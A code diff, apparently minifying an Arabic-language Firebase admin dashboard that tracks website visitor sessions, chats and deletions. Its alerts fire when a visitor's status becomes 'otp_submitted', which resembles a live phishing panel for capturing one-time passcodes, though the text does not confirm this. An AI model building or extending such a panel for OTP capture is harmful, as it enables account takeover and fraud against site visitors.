-          <div class="icon">👥</div>
-          <p>اختر زائراً من القائمة لعرض تفاصيله</p>
-        </div>`;
+      document.getElementById('mainPanel').innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>اختر زائراً من القائمة لعرض تفاصيله</p></div>`;
     }
   }
 
   window.clearAllSessions = function() {
     if (!confirm('هل تريد مسح جميع الجلسات؟')) return;
-    remove(ref(db, 'site1/sessions'));
-    selectedId = null;
-    sessions = {};
-    document.getElementById('mainPanel').innerHTML = `
-      <div class="empty-state">
-        <div class="icon">👥</div>
-        <p>اختر زائراً من القائمة لعرض تفاصيله</p>
-      </div>`;
+    remove(ref(db,'site1/sessions'));
+    selectedId = null; sessions = {};
+    document.getElementById('mainPanel').innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>اختر زائراً من القائمة لعرض تفاصيله</p></div>`;
   }
 
   function startListening() {
-    onValue(ref(db, 'site1/sessions'), (snap) => {
+    onValue(ref(db,'site1/sessions'), (snap) => {
       const data = snap.val() || {};
       Object.keys(data).forEach(id => {
         if (!knownIds.has(id)) {
           knownIds.add(id);
-          if (knownIds.size > 1) {
-            playSound('new');
-            showToast(`زائر جديد دخل الموقع: ${data[id].name || data[id].phone || 'مجهول'}`, 'new');
-          }
+          if (knownIds.size > 1) { playSound('new'); showToast(`زائر جديد: ${data[id].name||data[id].phone||'مجهول'}`,'new'); }
         }
         if (knownStatuses[id] && knownStatuses[id] !== data[id].status) {
-          const actionStatuses = ['waiting', 'otp_submitted'];
-          if (actionStatuses.includes(data[id].status)) {
+          if (['waiting','otp_submitted'].includes(data[id].status)) {
             playSound('action');
-            showToast(`${data[id].name || 'زائر'} قام بإجراء جديد: ${statusLabel(data[id].status)[0]}`, 'action');
+            showToast(`${data[id].name||'زائر'} قام بإجراء جديد: ${statusLabel(data[id].status)[0]}`,'action');
           }
         }
         knownStatuses[id] = data[id].status;
       });
-      sessions = data;
-      renderSidebar();
-      if (selectedId && sessions[selectedId]) {
-        renderDetail(selectedId);
-      }
+      sessions = data; renderSidebar();
+      if (selectedId && sessions[selectedId]) renderDetail(selectedId);
     });
   }
 
@@ -975,9 +735,7 @@
       document.getElementById('loginScreen').style.display = 'none';
       document.getElementById('dashboard').style.display = 'block';
       startListening();
-    } else {
-      document.getElementById('loginError').style.display = 'block';
-    }
+    } else { document.getElementById('loginError').style.display = 'block'; }
   }
 
   window.doLogout = function() {
@@ -988,22 +746,15 @@
 
   window.toggleClearMenu = function(e, id) {
     e.stopPropagation();
-    document.querySelectorAll('.clear-chat-menu').forEach(m => {
-      if (m.id !== 'clearMenu_' + id) m.classList.remove('open');
-    });
-    const menu = document.getElementById('clearMenu_' + id);
-    if (menu) menu.classList.toggle('open');
+    document.querySelectorAll('.clear-chat-menu').forEach(m => { if (m.id !== 'clearMenu_'+id) m.classList.remove('open'); });
+    document.getElementById('clearMenu_'+id)?.classList.toggle('open');
   }
-
-  document.addEventListener('click', () => {
-    document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
-  });
+  document.addEventListener('click', () => document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open')));
 
   window.clearAllChats = function(sessionId) {
-    if (!confirm('هل أنت متأكد من مسح جميع المحادثات لهذه الجلسة؟')) return;
-    remove(ref(db, `site1/sessions/${sessionId}/messages`)).then(() => {
+    if (!confirm('هل أنت متأكد من مسح جميع المحادثات؟')) return;
+    remove(ref(db,`site1/sessions/${sessionId}/messages`)).then(() => {
       document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
-      alert('تم مسح جميع المحادثات بنجاح');
       renderDetail(sessionId);
     });
   }
@@ -1013,29 +764,21 @@
     document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
     updateSelCount();
   }
-
   window.cancelSelection = function() {
     document.body.classList.remove('selection-mode');
     document.querySelectorAll('.vi-checkbox').forEach(cb => cb.checked = false);
   }
-
   function updateSelCount() {
     const count = document.querySelectorAll('.vi-checkbox:checked').length;
     const el = document.getElementById('selCount');
     if (el) el.textContent = count + ' محدد';
   }
-
   window.deleteSelected = function() {
     const checked = document.querySelectorAll('.vi-checkbox:checked');
-    if (checked.length === 0) { alert('لم تحدد أي جلسة'); return; }
-    if (!confirm('هل أنت متأكد من حذف ' + checked.length + ' جلسة؟')) return;
-    const promises = [];
-    checked.forEach(cb => {
-      promises.push(remove(ref(db, `site1/sessions/${cb.dataset.id}`)));
-    });
-    Promise.all(promises).then(() => {
+    if (!checked.length) { alert('لم تحدد أي جلسة'); return; }
+    if (!confirm('هل أنت متأكد من حذف '+checked.length+' جلسة؟')) return;
+    Promise.all([...checked].map(cb => remove(ref(db,`site1/sessions/${cb.dataset.id}`)))).then(() => {
       cancelSelection();
-      alert('تم الحذف بنجاح');
     });
   }
 </script>
